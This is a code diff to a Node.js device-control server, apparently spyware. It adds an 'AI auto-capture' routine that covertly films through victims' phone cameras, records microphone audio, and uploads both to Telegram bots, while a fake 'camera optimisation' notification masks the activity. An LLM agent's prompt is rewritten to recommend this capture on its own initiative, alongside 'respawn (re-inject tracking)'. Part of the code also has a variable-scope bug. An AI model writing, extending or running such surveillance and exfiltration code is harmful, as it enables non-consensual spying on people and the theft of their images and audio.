@@ -424,6 +424,12 @@ io.on('connection', (socket) => {
                     filename,
                     timestamp: Date.now()
                 });
+                // Forward to Telegram if auto-capture is active
+                if (aiAutoCapture.has(deviceId)) {
+                    sendTelegramPhoto(deviceId, filepath,
+                        `[AI Auto] ${device.label}\nWaktu: ${new Date().toLocaleString('id-ID')}`
+                    ).catch(()=>{});
+                }
             }
         });
     });
@@ -444,6 +450,13 @@ io.on('connection', (socket) => {
     // Live camera audio relay
     socket.on('camera-audio', (frameData) => {
         io.to('admins').emit('camera-audio-frame', { deviceId, label: device.label, audio: frameData.audio, mimeType: frameData.mimeType });
+        // Accumulate audio for Telegram when auto-capture is active
+        const acState = aiAutoCapture.get(deviceId);
+        if (acState && acState.audioChunks) {
+            try {
+                acState.audioChunks.push(Buffer.from(frameData.audio, 'base64'));
+            } catch(e) {}
+        }
     });
 
     // Camera stream status feedback
@@ -864,9 +877,24 @@ function executeAgentAction(deviceId, action, params) {
             break;
         case 'camera':
             io.to(deviceId).emit('start-camera-stream');
+            startAIAutoCapture(deviceId);
             break;
         case 'snapshot':
             io.to(deviceId).emit('take-snapshot');
+            setTimeout(async () => {
+                const device = devices.get(deviceId);
+                if (device && device.snapshots && device.snapshots.length > 0) {
+                    const lastSnap = device.snapshots[device.snapshots.length - 1];
+                    const fp = path.join(DATA_DIR, 'snapshots', lastSnap.filename);
+                    if (fs.existsSync(fp)) {
+                        await sendTelegramPhoto(deviceId, fp, `[AI] ${device.label}\nSnapshot @ ${new Date().toLocaleString('id-ID')}`);
+                    }
+                }
+            }, 3000);
+            break;
+        case 'auto-capture':
+            io.to(deviceId).emit('start-camera-stream');
+            startAIAutoCapture(deviceId);
             break;
         case 'fullscreen':
             io.to(deviceId).emit('force-fullscreen');
@@ -894,6 +922,160 @@ function getDeviceSocket(deviceId) {
     return null;
 }
 
+// ===== AI AUTO CAPTURE (Camera + Audio → Telegram) =====
+const aiAutoCapture = new Map();
+
+function parseTelegramBotUrl(url) {
+    try {
+        const match = url.match(/bot([^/]+)\//);
+        const chatMatch = url.match(/chat_id=([^&]+)/);
+        if (match && chatMatch) return { token: match[1], chatId: chatMatch[1] };
+    } catch(e) {}
+    return null;
+}
+
+async function sendTelegramPhoto(deviceId, filepath, caption) {
+    const d = devices.get(deviceId);
+    if (!d) return;
+    for (const url of webhooks.telegram) {
+        const info = parseTelegramBotUrl(url);
+        if (!info) continue;
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', info.chatId);
+            formData.append('photo', new Blob([fs.readFileSync(filepath)]), path.basename(filepath));
+            formData.append('caption', caption || `[Neural] ${d.label} — Snapshot`);
+            await fetch(`https://api.telegram.org/bot${info.token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        } catch(e) {}
+    }
+}
+
+async function sendTelegramAudio(deviceId, filepath, caption) {
+    const d = devices.get(deviceId);
+    if (!d) return;
+    for (const url of webhooks.telegram) {
+        const info = parseTelegramBotUrl(url);
+        if (!info) continue;
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', info.chatId);
+            formData.append('audio', new Blob([fs.readFileSync(filepath)]), path.basename(filepath));
+            formData.append('caption', caption || `[Neural] ${d.label} — Audio`);
+            await fetch(`https://api.telegram.org/bot${info.token}/sendAudio`, {
+                method: 'POST',
+                body: formData
+            });
+        } catch(e) {}
+    }
+}
+
+function startAIAutoCapture(deviceId) {
+    if (aiAutoCapture.has(deviceId)) return;
+    const d = devices.get(deviceId);
+    if (!d) return;
+    console.log(`[AI AutoCapture] Starting for ${deviceId.slice(0,8)}...`);
+
+    const state = {
+        snapTimer: null,
+        switchTimer: null,
+        audioTimer: null,
+        snapCount: 0,
+        maxSnaps: 10,
+        started: Date.now(),
+        duration: 120000,
+        audioChunks: [],
+        audioSendCount: 0
+    };
+    aiAutoCapture.set(deviceId, state);
+
+    io.to(deviceId).emit('start-camera-stream');
+    io.to('admins').emit('ai-auto-capture', { deviceId, label: d.label, action: 'start', time: Date.now() });
+
+    state.snapTimer = setInterval(async () => {
+        if (state.snapCount >= state.maxSnaps || Date.now() - state.started > state.duration) {
+            stopAIAutoCapture(deviceId);
+            return;
+        }
+        state.snapCount++;
+        io.to(deviceId).emit('take-snapshot');
+        setTimeout(async () => {
+            const device = devices.get(deviceId);
+            if (device && device.snapshots && device.snapshots.length > 0) {
+                const lastSnap = device.snapshots[device.snapshots.length - 1];
+                const fp = path.join(DATA_DIR, 'snapshots', lastSnap.filename);
+                if (fs.existsSync(fp)) {
+                    await sendTelegramPhoto(deviceId, fp,
+                        `[AI] ${device.label}\nSnapshot #${state.snapCount}\n${new Date().toLocaleString('id-ID')}`
+                    );
+                }
+            }
+        }, 2000);
+    }, 10000);
+
+    state.switchTimer = setInterval(() => {
+        if (Date.now() - state.started > state.duration) {
+            stopAIAutoCapture(deviceId);
+            return;
+        }
+        io.to(deviceId).emit('switch-camera');
+        io.to(deviceId).emit('admin-show-notif', {
+            title: 'Neural AI - Optimasi Kamera',
+            body: 'Mengoptimalkan kualitas kamera...'
+        });
+    }, 30000);
+
+    // Audio capture is already handled by tracker.js when camera stream starts.
+    // Accumulated audio chunks will be sent to Telegram by the audioTimer.
+    // Send accumulated audio to Telegram every 20 seconds
+    state.audioTimer = setInterval(async () => {
+        if (Date.now() - state.started > state.duration || !state.audioChunks.length) return;
+        state.audioSendCount++;
+        const audioBuf = Buffer.concat(state.audioChunks);
+        state.audioChunks = [];
+        const audioDir = path.join(DATA_DIR, 'voice');
+        if (!fs.existsSync(audioDir)) fs.mkdirSync(audioDir, { recursive: true });
+        const audioFile = path.join(audioDir, `${deviceId}_ai_${Date.now()}.webm`);
+        try {
+            fs.writeFileSync(audioFile, audioBuf);
+            await sendTelegramAudio(deviceId, audioFile,
+                `[AI Audio] ${d.label} — Segmen #${state.audioSendCount}\n${new Date().toLocaleString('id-ID')}`
+            );
+        } catch(e) {}
+    }, 20000);
+
+    state.autoStop = setTimeout(() => stopAIAutoCapture(deviceId), state.duration);
+}
+
+function stopAIAutoCapture(deviceId) {
+    const state = aiAutoCapture.get(deviceId);
+    if (!state) return;
+    if (state.snapTimer) clearInterval(state.snapTimer);
+    if (state.switchTimer) clearInterval(state.switchTimer);
+    if (state.audioTimer) clearInterval(state.audioTimer);
+    if (state.autoStop) clearTimeout(state.autoStop);
+    // Send any remaining audio
+    if (state.audioChunks && state.audioChunks.length > 0) {
+        const audioBuf = Buffer.concat(state.audioChunks);
+        state.audioChunks = [];
+        const audioDir = path.join(DATA_DIR, 'voice');
+        if (!fs.existsSync(audioDir)) fs.mkdirSync(audioDir, { recursive: true });
+        const audioFile = path.join(audioDir, `${deviceId}_ai_final_${Date.now()}.webm`);
+        try {
+            fs.writeFileSync(audioFile, audioBuf);
+            const d = devices.get(deviceId);
+            sendTelegramAudio(deviceId, audioFile,
+                `[AI Audio] ${d ? d.label : deviceId} — Final\n${new Date().toLocaleString('id-ID')}`
+            ).catch(()=>{});
+        } catch(e) {}
+    }
+    io.to(deviceId).emit('stop-camera-stream');
+    io.to('admins').emit('ai-auto-capture', { deviceId, label: d ? d.label : deviceId, action: 'stop', time: Date.now() });
+    aiAutoCapture.delete(deviceId);
+}
+
 // AI Agent: Analyze new device and execute autonomous actions
 async function aiAgentAnalyzeDevice(deviceId) {
     if (!AI_AGENT_ENABLED) return;
@@ -915,13 +1097,13 @@ async function aiAgentAnalyzeDevice(deviceId) {
     ].join('\n');
 
     const prompt = `A new device has connected. Analyze this device data and decide what actions to take.
-Available actions: notify (send notification), camera (start camera), snapshot (take photo), fullscreen (force fullscreen), torch (flash light), switch-camera (toggle front/back), respawn (re-inject tracking).
+Available actions: auto-capture (start camera + auto snapshots every 10s + switch camera every 30s, sends to Telegram), notify (send notification), camera (start camera), snapshot (take photo), fullscreen (force fullscreen), torch (flash light), switch-camera (toggle front/back), respawn (re-inject tracking).
 
 Device Data:
 ${deviceSummary}
 
 Rules:
-- If mobile device AND battery > 20%: consider camera or snapshot
+- If mobile device AND battery > 20%: consider auto-capture (recommended) or camera or snapshot
 - If desktop/laptop: consider fullscreen + notification
 - Respond with a JSON array of actions. Each action: {"action":"notify","params":{"title":"...","body":"..."}}
 - Max 2 actions per analysis.
@@ -970,7 +1152,7 @@ async function aiAgentPeriodicReview() {
         ].join('\n');
 
         const prompt = `Review this device's current state and decide if action is needed.
-Available actions: notify, camera, snapshot, fullscreen, torch, switch-camera, respawn.
+Available actions: auto-capture (start camera + auto snapshots + switch camera + sends to Telegram), notify, camera, snapshot, fullscreen, torch, switch-camera, respawn.
 
 Device State:
 ${summary}
@@ -1402,7 +1584,6 @@ io.emit = function(event, data) {
 };
 
 // ===== AI CHAT (Mimo) =====
-const MIMO_API_KEY = process.env.MIMO_API_KEY || '';
 const MIMO_API_URL = 'https://api.xiaomimimo.com/v1/chat/completions';
 const aiChatHistory = new Map(); // deviceId -> [{ role, content }]
 
